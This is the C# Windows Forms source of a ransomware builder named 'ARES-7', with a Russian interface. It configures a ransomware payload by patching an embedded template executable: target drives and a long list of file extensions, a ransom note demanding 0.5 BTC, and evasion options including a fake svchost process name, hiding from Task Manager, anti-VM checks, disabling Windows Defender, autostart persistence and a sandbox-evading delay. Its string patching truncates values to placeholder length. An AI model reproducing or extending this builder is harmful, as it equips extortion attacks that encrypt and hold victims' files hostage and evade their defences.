using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        private TabControl tabControl;
        private ComboBox cbAlgorithm;
        private TextBox txtEncryptedExt;
        private CheckBox chkC, chkD, chkE, chkZ;
        private TextBox txtCustomDrive;
        private TextBox txtIncludeFolders;
        private TextBox txtExcludeFolders;
        private CheckedListBox clbExtensions;
        private TextBox txtCustomExt;
        private Label lblWallpaper;
        private TextBox txtNoteName;
        private TextBox txtNoteContent;
        private CheckBox chkFakeProcess;
        private TextBox txtFakeProcessName;
        private CheckBox chkHideProcess;
        private CheckBox chkAntiVM;
        private CheckBox chkDisableDefender;
        private CheckBox chkAddPersistence;
        private CheckBox chkHideFilesAttr;
        private CheckBox chkSandboxDelay;
        private TextBox txtOutputName;
        private TextBox txtOutputPath;
        private TextBox txtIconPath;
        private Label lblStatus;
        private Label lblDetail;
        private ProgressBar progressBar;
        private Button btnBuild;
        private Button btnSelectIcon;
        private Button btnSelectPath;
        
        private List<string> drives = new List<string>();
        private List<string> extensions = new List<string>();
        private string wallpaperPath = "";
        
        public Form1()
        {
            InitializeComponent();
            LoadExtensions();
            LoadDefaultSettings();
        }
        
        private void InitializeComponent()
        {
            this.Text = "🔐 ARES-7 Ransomware Builder v6.0 (C++)";
            this.Size = new Size(1150, 850);
            this.BackColor = Color.FromArgb(10, 10, 10);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.MinimumSize = new Size(1000, 750);
            
            // TabControl
            tabControl = new TabControl();
            tabControl.Dock = DockStyle.Fill;
            tabControl.BackColor = Color.FromArgb(10, 10, 10);
            
            // Создаём вкладки
            var tab1 = CreateTabEncryption();
            var tab2 = CreateTabExtensions();
            var tab3 = CreateTabWallpaper();
            var tab4 = CreateTabStealth();
            var tab5 = CreateTabBuild();
            
            tabControl.TabPages.Add(tab1);
            tabControl.TabPages.Add(tab2);
            tabControl.TabPages.Add(tab3);
            tabControl.TabPages.Add(tab4);
            tabControl.TabPages.Add(tab5);
            
            // Кнопка и статус
            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 150;
            bottomPanel.BackColor = Color.FromArgb(10, 10, 10);
            
            btnBuild = new Button();
            btnBuild.Text = "🔥 ПОСТРОИТЬ RANSOMWARE";
            btnBuild.Dock = DockStyle.Bottom;
            btnBuild.Height = 60;
            btnBuild.BackColor = Color.FromArgb(0, 204, 51);
            btnBuild.ForeColor = Color.Black;
            btnBuild.Font = new Font("Segoe UI", 14, FontStyle.Bold);
            btnBuild.Click += BtnBuild_Click;
            
            lblStatus = new Label();
            lblStatus.Dock = DockStyle.Bottom;
            lblStatus.Text = "✅ Готов к сборке";
            lblStatus.ForeColor = Color.Gray;
            lblStatus.Font = new Font("Segoe UI", 10);
            lblStatus.Height = 30;
            
            lblDetail = new Label();
            lblDetail.Dock = DockStyle.Bottom;
            lblDetail.Text = "";
            lblDetail.ForeColor = Color.DarkGray;
            lblDetail.Font = new Font("Segoe UI", 9);
            lblDetail.Height = 25;
            
            progressBar = new ProgressBar();
            progressBar.Dock = DockStyle.Bottom;
            progressBar.Style = ProgressBarStyle.Marquee;
            progressBar.Visible = false;
            progressBar.Height = 20;
            
            bottomPanel.Controls.Add(btnBuild);
            bottomPanel.Controls.Add(progressBar);
            bottomPanel.Controls.Add(lblStatus);
            bottomPanel.Controls.Add(lblDetail);
            
            this.Controls.Add(tabControl);
            this.Controls.Add(bottomPanel);
        }
        
        private TabPage CreateTabEncryption()
        {
            var tab = new TabPage("⚙ Шифрование");
            tab.BackColor = Color.FromArgb(10, 10, 10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.ColumnCount = 2;
            panel.Padding = new Padding(15);
            panel.BackColor = Color.FromArgb(10, 10, 10);
            
            // Алгоритм
            panel.Controls.Add(CreateLabel("Алгоритм шифрования:"), 0, 0);
            cbAlgorithm = new ComboBox();
            cbAlgorithm.Items.AddRange(new object[] { "AES-256", "Salsa20", "RSA" });
            cbAlgorithm.SelectedIndex = 0;
            cbAlgorithm.BackColor = Color.FromArgb(17, 17, 17);
            cbAlgorithm.ForeColor = Color.FromArgb(0, 255, 65);
            cbAlgorithm.FlatStyle = FlatStyle.Flat;
            panel.Controls.Add(cbAlgorithm, 1, 0);
            
            // Расширение зашифрованных
            panel.Controls.Add(CreateLabel("Расширение зашифрованных файлов:"), 0, 1);
            txtEncryptedExt = new TextBox();
            txtEncryptedExt.Text = ".enc";
            txtEncryptedExt.BackColor = Color.FromArgb(17, 17, 17);
            txtEncryptedExt.ForeColor = Color.FromArgb(0, 255, 65);
            txtEncryptedExt.BorderStyle = BorderStyle.FixedSingle;
            panel.Controls.Add(txtEncryptedExt, 1, 1);
            
            // Диски
            panel.Controls.Add(CreateLabel("Диски для шифрования:"), 0, 2);
            var drivesPanel = new FlowLayoutPanel();
            drivesPanel.FlowDirection = FlowDirection.LeftToRight;
            drivesPanel.BackColor = Color.FromArgb(10, 10, 10);
            
            chkC = new CheckBox(); chkC.Text = "C:\\"; chkC.ForeColor = Color.FromArgb(0, 255, 65); chkC.BackColor = Color.FromArgb(10, 10, 10);
            chkD = new CheckBox(); chkD.Text = "D:\\"; chkD.ForeColor = Color.FromArgb(0, 255, 65); chkD.BackColor = Color.FromArgb(10, 10, 10);
            chkE = new CheckBox(); chkE.Text = "E:\\"; chkE.ForeColor = Color.FromArgb(0, 255, 65); chkE.BackColor = Color.FromArgb(10, 10, 10);
            chkZ = new CheckBox(); chkZ.Text = "Z:\\"; chkZ.ForeColor = Color.FromArgb(0, 255, 65); chkZ.BackColor = Color.FromArgb(10, 10, 10);
            
            drivesPanel.Controls.AddRange(new Control[] { chkC, chkD, chkE, chkZ });
            panel.Controls.Add(drivesPanel, 1, 2);
            
            // Добавить диск
            panel.Controls.Add(CreateLabel("Добавить диск:"), 0, 3);
            var addDrivePanel = new FlowLayoutPanel();
            addDrivePanel.FlowDirection = FlowDirection.LeftToRight;
            addDrivePanel.BackColor = Color.FromArgb(10, 10, 10);
            
            txtCustomDrive = new TextBox();
            txtCustomDrive.Width = 120;
            txtCustomDrive.BackColor = Color.FromArgb(17, 17, 17);
            txtCustomDrive.ForeColor = Color.FromArgb(0, 255, 65);
            txtCustomDrive.BorderStyle = BorderStyle.FixedSingle;
            
            var btnAddDrive = new Button();
            btnAddDrive.Text = "➕ Добавить";
            btnAddDrive.BackColor = Color.FromArgb(17, 17, 17);
            btnAddDrive.ForeColor = Color.FromArgb(0, 255, 65);
            btnAddDrive.FlatStyle = FlatStyle.Flat;
            btnAddDrive.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomDrive.Text))
                    MessageBox.Show($"Диск {txtCustomDrive.Text} добавлен");
            };
            
            addDrivePanel.Controls.AddRange(new Control[] { txtCustomDrive, btnAddDrive });
            panel.Controls.Add(addDrivePanel, 1, 3);
            
            // Папки для шифрования
            panel.Controls.Add(CreateLabel("Папки для шифрования (по одной на строку):"), 0, 4);
            txtIncludeFolders = new TextBox();
            txtIncludeFolders.Multiline = true;
            txtIncludeFolders.Height = 80;
            txtIncludeFolders.BackColor = Color.FromArgb(17, 17, 17);
            txtIncludeFolders.ForeColor = Color.FromArgb(0, 255, 65);
            txtIncludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtIncludeFolders.Font = new Font("Consolas", 9);
            panel.Controls.Add(txtIncludeFolders, 1, 4);
            
            // Папки для обхода
            panel.Controls.Add(CreateLabel("Папки для обхода (по одной на строку):"), 0, 5);
            txtExcludeFolders = new TextBox();
            txtExcludeFolders.Multiline = true;
            txtExcludeFolders.Height = 80;
            txtExcludeFolders.Text = "C:\\Windows\r\nC:\\Program Files\r\nC:\\Program Files (x86)";
            txtExcludeFolders.BackColor = Color.FromArgb(17, 17, 17);
            txtExcludeFolders.ForeColor = Color.FromArgb(0, 255, 65);
            txtExcludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtExcludeFolders.Font = new Font("Consolas", 9);
            panel.Controls.Add(txtExcludeFolders, 1, 5);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabExtensions()
        {
            var tab = new TabPage("📁 Расширения");
            tab.BackColor = Color.FromArgb(10, 10, 10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 3;
            panel.Padding = new Padding(15);
            panel.BackColor = Color.FromArgb(10, 10, 10);
            
            // Заголовок
            var headerPanel = new FlowLayoutPanel();
            headerPanel.FlowDirection = FlowDirection.LeftToRight;
            headerPanel.BackColor = Color.FromArgb(10, 10, 10);
            headerPanel.Controls.Add(CreateLabel("Выберите расширения файлов для шифрования:"));
            
            var btnSelectAll = new Button();
            btnSelectAll.Text = "Выбрать все";
            btnSelectAll.BackColor = Color.FromArgb(17, 17, 17);
            btnSelectAll.ForeColor = Color.FromArgb(0, 255, 65);
            btnSelectAll.FlatStyle = FlatStyle.Flat;
            btnSelectAll.Click += (s, e) => { for (int i = 0; i < clbExtensions.Items.Count; i++) clbExtensions.SetItemChecked(i, true); };
            headerPanel.Controls.Add(btnSelectAll);
            
            var btnDeselectAll = new Button();
            btnDeselectAll.Text = "Снять все";
            btnDeselectAll.BackColor = Color.FromArgb(17, 17, 17);
            btnDeselectAll.ForeColor = Color.FromArgb(0, 255, 65);
            btnDeselectAll.FlatStyle = FlatStyle.Flat;
            btnDeselectAll.Click += (s, e) => { for (int i = 0; i < clbExtensions.Items.Count; i++) clbExtensions.SetItemChecked(i, false); };
            headerPanel.Controls.Add(btnDeselectAll);
            
            panel.Controls.Add(headerPanel, 0, 0);
            
            // Список расширений
            clbExtensions = new CheckedListBox();
            clbExtensions.Dock = DockStyle.Fill;
            clbExtensions.BackColor = Color.FromArgb(17, 17, 17);
            clbExtensions.ForeColor = Color.FromArgb(0, 255, 65);
            clbExtensions.BorderStyle = BorderStyle.None;
            panel.Controls.Add(clbExtensions, 0, 1);
            
            // Добавить своё расширение
            var addPanel = new FlowLayoutPanel();
            addPanel.FlowDirection = FlowDirection.LeftToRight;
            addPanel.BackColor = Color.FromArgb(10, 10, 10);
            
            addPanel.Controls.Add(CreateLabel("Добавить своё расширение:"));
            txtCustomExt = new TextBox();
            txtCustomExt.Width = 120;
            txtCustomExt.BackColor = Color.FromArgb(17, 17, 17);
            txtCustomExt.ForeColor = Color.FromArgb(0, 255, 65);
            txtCustomExt.BorderStyle = BorderStyle.FixedSingle;
            addPanel.Controls.Add(txtCustomExt);
            
            var btnAddExt = new Button();
            btnAddExt.Text = "➕ Добавить";
            btnAddExt.BackColor = Color.FromArgb(17, 17, 17);
            btnAddExt.ForeColor = Color.FromArgb(0, 255, 65);
            btnAddExt.FlatStyle = FlatStyle.Flat;
            btnAddExt.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomExt.Text))
                {
                    clbExtensions.Items.Add(txtCustomExt.Text, true);
                    txtCustomExt.Text = "";
                }
            };
            addPanel.Controls.Add(btnAddExt);
            
            panel.Controls.Add(addPanel, 0, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabWallpaper()
        {
            var tab = new TabPage("🖼 Обои / Выкуп");
            tab.BackColor = Color.FromArgb(10, 10, 10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = Color.FromArgb(10, 10, 10);
            
            // Обои
            panel.Controls.Add(CreateLabel("Файл обоев (JPG/PNG/BMP):"), 0, 0);
            var wallPanel = new FlowLayoutPanel();
            wallPanel.FlowDirection = FlowDirection.LeftToRight;
            wallPanel.BackColor = Color.FromArgb(10, 10, 10);
            
            lblWallpaper = new Label();
            lblWallpaper.Text = "Не выбрано";
            lblWallpaper.ForeColor = Color.Gray;
            lblWallpaper.AutoSize = true;
            wallPanel.Controls.Add(lblWallpaper);
            
            var btnWallpaper = new Button();
            btnWallpaper.Text = "📂 Выбрать";
            btnWallpaper.BackColor = Color.FromArgb(17, 17, 17);
            btnWallpaper.ForeColor = Color.FromArgb(0, 255, 65);
            btnWallpaper.FlatStyle = FlatStyle.Flat;
            btnWallpaper.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "Images|*.jpg;*.jpeg;*.png;*.bmp";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        wallpaperPath = ofd.FileName;
                        lblWallpaper.Text = Path.GetFileName(ofd.FileName);
                        lblWallpaper.ForeColor = Color.FromArgb(0, 255, 65);
                    }
                }
            };
            wallPanel.Controls.Add(btnWallpaper);
            
            wallPanel.Controls.Add(CreateLabel("(JPG, PNG, BMP)", Color.Gray));
            panel.Controls.Add(wallPanel, 1, 0);
            
            // Имя файла выкупа
            panel.Controls.Add(CreateLabel("Имя файла выкупа:"), 0, 1);
            var noteNamePanel = new FlowLayoutPanel();
            noteNamePanel.FlowDirection = FlowDirection.LeftToRight;
            noteNamePanel.BackColor = Color.FromArgb(10, 10, 10);
            
            txtNoteName = new TextBox();
            txtNoteName.Text = "READ_ME.txt";
            txtNoteName.Width = 200;
            txtNoteName.BackColor = Color.FromArgb(17, 17, 17);
            txtNoteName.ForeColor = Color.FromArgb(0, 255, 65);
            txtNoteName.BorderStyle = BorderStyle.FixedSingle;
            noteNamePanel.Controls.Add(txtNoteName);
            noteNamePanel.Controls.Add(CreateLabel("(например: READ_ME.txt)", Color.Gray));
            panel.Controls.Add(noteNamePanel, 1, 1);
            
            // Содержимое выкупа
            panel.Controls.Add(CreateLabel("Содержимое файла выкупа:"), 0, 2);
            txtNoteContent = new TextBox();
            txtNoteContent.Multiline = true;
            txtNoteContent.Height = 150;
            txtNoteContent.Text = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
            txtNoteContent.BackColor = Color.FromArgb(17, 17, 17);
            txtNoteContent.ForeColor = Color.FromArgb(0, 255, 65);
            txtNoteContent.BorderStyle = BorderStyle.FixedSingle;
            txtNoteContent.Font = new Font("Consolas", 9);
            panel.Controls.Add(txtNoteContent, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabStealth()
        {
            var tab = new TabPage("🕵 Скрытность");
            tab.BackColor = Color.FromArgb(10, 10, 10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 6;
            panel.Padding = new Padding(15);
            panel.BackColor = Color.FromArgb(10, 10, 10);
            panel.AutoScroll = true;
            
            int row = 0;
            
            // Маскировка процесса
            panel.Controls.Add(CreateLabel("Маскировка процесса:", Color.White), 0, row);
            var fakePanel = new FlowLayoutPanel();
            fakePanel.FlowDirection = FlowDirection.LeftToRight;
            fakePanel.BackColor = Color.FromArgb(10, 10, 10);
            
            chkFakeProcess = new CheckBox();
            chkFakeProcess.Text = "Включить фейк-процесс";
            chkFakeProcess.ForeColor = Color.FromArgb(0, 255, 65);
            chkFakeProcess.BackColor = Color.FromArgb(10, 10, 10);
            fakePanel.Controls.Add(chkFakeProcess);
            
            txtFakeProcessName = new TextBox();
            txtFakeProcessName.Text = "svchost.exe";
            txtFakeProcessName.Width = 120;
            txtFakeProcessName.BackColor = Color.FromArgb(17, 17, 17);
            txtFakeProcessName.ForeColor = Color.FromArgb(0, 255, 65);
            txtFakeProcessName.BorderStyle = BorderStyle.FixedSingle;
            fakePanel.Controls.Add(txtFakeProcessName);
            fakePanel.Controls.Add(CreateLabel("(имя в диспетчере)", Color.Gray));
            
            panel.Controls.Add(fakePanel, 1, row++);
            
            // Скрытие процесса
            panel.Controls.Add(CreateLabel("Скрытие процесса:", Color.White), 0, row);
            chkHideProcess = new CheckBox();
            chkHideProcess.Text = "Полное скрытие из Task Manager (требует админ-прав)";
            chkHideProcess.ForeColor = Color.FromArgb(0, 255, 65);
            chkHideProcess.BackColor = Color.FromArgb(10, 10, 10);
            panel.Controls.Add(chkHideProcess, 1, row++);
            
            // Анти-VM
            panel.Controls.Add(CreateLabel("Анти-VM:", Color.White), 0, row);
            chkAntiVM = new CheckBox();
            chkAntiVM.Text = "Завершить работу при обнаружении виртуальной машины";
            chkAntiVM.ForeColor = Color.FromArgb(0, 255, 65);
            chkAntiVM.BackColor = Color.FromArgb(10, 10, 10);
            panel.Controls.Add(chkAntiVM, 1, row++);
            
            // Дополнительные методы
            panel.Controls.Add(CreateLabel("Дополнительные методы обхода:", Color.White), 0, row);
            var extraPanel = new FlowLayoutPanel();
            extraPanel.FlowDirection = FlowDirection.TopDown;
            extraPanel.BackColor = Color.FromArgb(10, 10, 10);
            
            chkDisableDefender = new CheckBox();
            chkDisableDefender.Text = "Отключение Windows Defender";
            chkDisableDefender.ForeColor = Color.FromArgb(0, 255, 65);
            chkDisableDefender.BackColor = Color.FromArgb(10, 10, 10);
            extraPanel.Controls.Add(chkDisableDefender);
            
            chkAddPersistence = new CheckBox();
            chkAddPersistence.Text = "Добавление в автозагрузку";
            chkAddPersistence.ForeColor = Color.FromArgb(0, 255, 65);
            chkAddPersistence.BackColor = Color.FromArgb(10, 10, 10);
            extraPanel.Controls.Add(chkAddPersistence);
            
            chkHideFilesAttr = new CheckBox();
            chkHideFilesAttr.Text = "Скрытие файлов (атрибут +h)";
            chkHideFilesAttr.ForeColor = Color.FromArgb(0, 255, 65);
            chkHideFilesAttr.BackColor = Color.FromArgb(10, 10, 10);
            extraPanel.Controls.Add(chkHideFilesAttr);
            
            chkSandboxDelay = new CheckBox();
            chkSandboxDelay.Text = "Задержка 60 сек (обход песочниц)";
            chkSandboxDelay.ForeColor = Color.FromArgb(0, 255, 65);
            chkSandboxDelay.BackColor = Color.FromArgb(10, 10, 10);
            extraPanel.Controls.Add(chkSandboxDelay);
            
            panel.Controls.Add(extraPanel, 1, row++);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabBuild()
        {
            var tab = new TabPage("📦 Сборка");
            tab.BackColor = Color.FromArgb(10, 10, 10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = Color.FromArgb(10, 10, 10);
            
            // Имя файла
            panel.Controls.Add(CreateLabel("Имя выходного файла:"), 0, 0);
            var namePanel = new FlowLayoutPanel();
            namePanel.FlowDirection = FlowDirection.LeftToRight;
            namePanel.BackColor = Color.FromArgb(10, 10, 10);
            
            txtOutputName = new TextBox();
            txtOutputName.Text = "ransomware.exe";
            txtOutputName.Width = 200;
            txtOutputName.BackColor = Color.FromArgb(17, 17, 17);
            txtOutputName.ForeColor = Color.FromArgb(0, 255, 65);
            txtOutputName.BorderStyle = BorderStyle.FixedSingle;
            namePanel.Controls.Add(txtOutputName);
            namePanel.Controls.Add(CreateLabel("(например: update.exe)", Color.Gray));
            panel.Controls.Add(namePanel, 1, 0);
            
            // Путь сохранения
            panel.Controls.Add(CreateLabel("Путь сохранения:"), 0, 1);
            var pathPanel = new FlowLayoutPanel();
            pathPanel.FlowDirection = FlowDirection.LeftToRight;
            pathPanel.BackColor = Color.FromArgb(10, 10, 10);
            
            txtOutputPath = new TextBox();
            txtOutputPath.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            txtOutputPath.Width = 300;
            txtOutputPath.BackColor = Color.FromArgb(17, 17, 17);
            txtOutputPath.ForeColor = Color.FromArgb(0, 255, 65);
            txtOutputPath.BorderStyle = BorderStyle.FixedSingle;
            pathPanel.Controls.Add(txtOutputPath);
            
            btnSelectPath = new Button();
            btnSelectPath.Text = "📂 Обзор";
            btnSelectPath.BackColor = Color.FromArgb(17, 17, 17);
            btnSelectPath.ForeColor = Color.FromArgb(0, 255, 65);
            btnSelectPath.FlatStyle = FlatStyle.Flat;
            btnSelectPath.Click += (s, e) => {
                using (var fbd = new FolderBrowserDialog())
                {
                    if (fbd.ShowDialog() == DialogResult.OK)
                        txtOutputPath.Text = fbd.SelectedPath;
                }
            };
            pathPanel.Controls.Add(btnSelectPath);
            panel.Controls.Add(pathPanel, 1, 1);
            
            // Иконка
            panel.Controls.Add(CreateLabel("Иконка для EXE (.ico):"), 0, 2);
            var iconPanel = new FlowLayoutPanel();
            iconPanel.FlowDirection = FlowDirection.LeftToRight;
            iconPanel.BackColor = Color.FromArgb(10, 10, 10);
            
            var lblIcon = new Label();
            lblIcon.Text = "Не выбрано (будет стандартная)";
            lblIcon.ForeColor = Color.Gray;
            iconPanel.Controls.Add(lblIcon);
            
            btnSelectIcon = new Button();
            btnSelectIcon.Text = "📂 Выбрать";
            btnSelectIcon.BackColor = Color.FromArgb(17, 17, 17);
            btnSelectIcon.ForeColor = Color.FromArgb(0, 255, 65);
            btnSelectIcon.FlatStyle = FlatStyle.Flat;
            btnSelectIcon.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "ICO files|*.ico";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        txtIconPath.Text = ofd.FileName;
                        lblIcon.Text = Path.GetFileName(ofd.FileName);
                        lblIcon.ForeColor = Color.FromArgb(0, 255, 65);
                    }
                }
            };
            iconPanel.Controls.Add(btnSelectIcon);
            
            txtIconPath = new TextBox();
            txtIconPath.Visible = false;
            iconPanel.Controls.Add(txtIconPath);
            
            iconPanel.Controls.Add(CreateLabel("(только .ico)", Color.Gray));
            panel.Controls.Add(iconPanel, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private Label CreateLabel(string text, Color? color = null)
        {
            var lbl = new Label();
            lbl.Text = text;
            lbl.ForeColor = color ?? Color.FromArgb(0, 255, 65);
            lbl.Font = new Font("Segoe UI", 10, FontStyle.Bold);
            lbl.AutoSize = true;
            lbl.BackColor = Color.FromArgb(10, 10, 10);
            return lbl;
        }
        
        private void LoadExtensions()
        {
            string[] extList = {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".raw",
                ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg", ".m4a",
                ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".mpeg",
                ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
                ".exe", ".dll", ".sys", ".msi", ".apk", ".app", ".deb", ".rpm",
                ".py", ".js", ".html", ".css", ".php", ".asp", ".jsp", ".xml", ".json",
                ".sql", ".db", ".mdb", ".accdb", ".sqlite",
                ".pem", ".key", ".crt", ".csr", ".pfx", ".p12",
                ".vmdk", ".vhd", ".vdi", ".qcow2",
                ".iso", ".img", ".bin", ".cue",
                ".log", ".bak", ".old", ".tmp", ".swp",
                ".cs", ".cpp", ".c", ".h", ".java", ".class", ".rb", ".go", ".rs"
            };
            
            foreach (var ext in extList)
                clbExtensions.Items.Add(ext, true);
        }
        
        private void LoadDefaultSettings()
        {
            chkC.Checked = true;
        }
        
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                // 1. Собираем параметры
                string algorithm = cbAlgorithm.SelectedItem?.ToString() ?? "AES-256";
                int algoValue = algorithm == "AES-256" ? 0 : algorithm == "Salsa20" ? 1 : 2;
                
                List<string> selectedDrives = new List<string>();
                if (chkC.Checked) selectedDrives.Add("C:\\");
                if (chkD.Checked) selectedDrives.Add("D:\\");
                if (chkE.Checked) selectedDrives.Add("E:\\");
                if (chkZ.Checked) selectedDrives.Add("Z:\\");
                
                if (selectedDrives.Count == 0)
                {
                    MessageBox.Show("Выберите хотя бы один диск!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                
                List<string> selectedExts = new List<string>();
                foreach (var item in clbExtensions.CheckedItems)
                    selectedExts.Add(item.ToString());
                
                string encryptedExt = txtEncryptedExt.Text;
                string noteName = txtNoteName.Text;
                string noteContent = txtNoteContent.Text;
                string outputName = txtOutputName.Text;
                string outputPath = txtOutputPath.Text;
                
                // 2. Извлекаем шаблон из ресурсов
                byte[] template;
                using (var stream = GetType().Assembly.GetManifestResourceStream("RansomwareBuilder.template.exe"))
                {
                    if (stream == null)
                    {
                        MessageBox.Show("Шаблон не найден в ресурсах! template.exe должен быть встроен.", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                    template = new byte[stream.Length];
                    stream.Read(template, 0, template.Length);
                }
                
                // 3. Патчим шаблон (замена байт)
                // Алгоритм
                byte[] algoBytes = BitConverter.GetBytes(algoValue);
                ReplacePattern(template, new byte[] { 0xEF, 0xBE, 0xAD, 0xDE }, algoBytes);
                
                // Диски
                string drivesStr = string.Join("|", selectedDrives);
                ReplaceString(template, "|DRIVES|", drivesStr);
                
                // Расширения
                string extsStr = string.Join("|", selectedExts);
                ReplaceString(template, "|EXTS|", extsStr);
                
                // Расширение зашифрованных
                ReplaceString(template, "|ENC_EXT|", encryptedExt);
                
                // Имя и текст выкупа
                ReplaceString(template, "|NOTE_NAME|", noteName);
                ReplaceString(template, "|NOTE_CONTENT|", noteContent);
                
                // Включение скрытности
                ReplaceByte(template, "|FAKE_ENABLED|", chkFakeProcess.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|HIDE_ENABLED|", chkHideProcess.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|ANTIVM_ENABLED|", chkAntiVM.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|DEFENDER_ENABLED|", chkDisableDefender.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|PERSIST_ENABLED|", chkAddPersistence.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|HIDEFILES_ENABLED|", chkHideFilesAttr.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|DELAY_ENABLED|", chkSandboxDelay.Checked ? (byte)1 : (byte)0);
                
                // Имя фейк-процесса
                ReplaceString(template, "|FAKE_NAME|", txtFakeProcessName.Text);
                
                // Папки для шифрования и обхода
                ReplaceString(template, "|INCLUDE_FOLDERS|", txtIncludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"));
                ReplaceString(template, "|EXCLUDE_FOLDERS|", txtExcludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"));
                
                // Обои
                if (!string.IsNullOrEmpty(wallpaperPath))
                {
                    string base64 = Convert.ToBase64String(File.ReadAllBytes(wallpaperPath));
                    ReplaceString(template, "|WALLPAPER|", base64);
                }
                
                // 4. Сохраняем
                string finalPath = Path.Combine(outputPath, outputName);
                File.WriteAllBytes(finalPath, template);
                
                long sizeKB = new FileInfo(finalPath).Length / 1024;
                MessageBox.Show($"✅ Файл создан!\n\n📁 {finalPath}\n\nРазмер: {sizeKB} КБ", "✅ Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка: {ex.Message}\n\n{ex.StackTrace}", "❌ Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        
        private void ReplacePattern(byte[] data, byte[] pattern, byte[] replacement)
        {
            for (int i = 0; i < data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j]) { found = false; break; }
                }
                if (found)
                {
                    for (int j = 0; j < Math.Min(replacement.Length, pattern.Length); j++)
                        data[i + j] = replacement[j];
                    return;
                }
            }
        }
        
        private void ReplaceString(byte[] data, string placeholder, string value)
        {
            byte[] placeholderBytes = Encoding.UTF8.GetBytes(placeholder);
            byte[] valueBytes = Encoding.UTF8.GetBytes(value);
            
            for (int i = 0; i < data.Length - placeholderBytes.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < placeholderBytes.Length; j++)
                {
                    if (data[i + j] != placeholderBytes[j]) { found = false; break; }
                }
                if (found)
                {
                    int maxLen = Math.Min(valueBytes.Length, placeholderBytes.Length - 1);
                    for (int j = 0; j < maxLen; j++)
                        data[i + j] = valueBytes[j];
                    // Оставляем завершающий ноль
                    for (int j = maxLen; j < placeholderBytes.Length; j++)
                        data[i + j] = 0;
                    return;
                }
            }
        }
        
        private void ReplaceByte(byte[] data, string placeholder, byte value)
        {
            byte[] placeholderBytes = Encoding.UTF8.GetBytes(placeholder);
            for (int i = 0; i < data.Length - placeholderBytes.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < placeholderBytes.Length; j++)
                {
                    if (data[i + j] != placeholderBytes[j]) { found = false; break; }
                }
                if (found)
                {
                    data[i] = value;
                    return;
                }
            }
        }
    }
}
